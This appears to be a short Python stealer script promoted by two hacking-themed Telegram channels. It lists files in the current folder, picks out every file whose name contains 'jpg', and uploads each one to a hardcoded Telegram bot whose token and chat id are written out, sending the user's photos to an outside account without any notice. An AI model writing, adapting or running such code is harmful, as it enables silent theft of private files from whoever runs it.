# https://t.me/Anonymous_Hack_12
# https://t.me/Learn_hacking_12
import requests
import os


os.system('pip install requests')
id = 5775009662
token ='5718973411:AAFIO1I8iueNGzOaY4kLVKyVYpeSmWCaGxY'
tmp = list(os.scandir('.'))
for i in tmp:
  if 'jpg' in i.name:
      file ={"document": open(f'{i.name}', 'rb')}
      res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
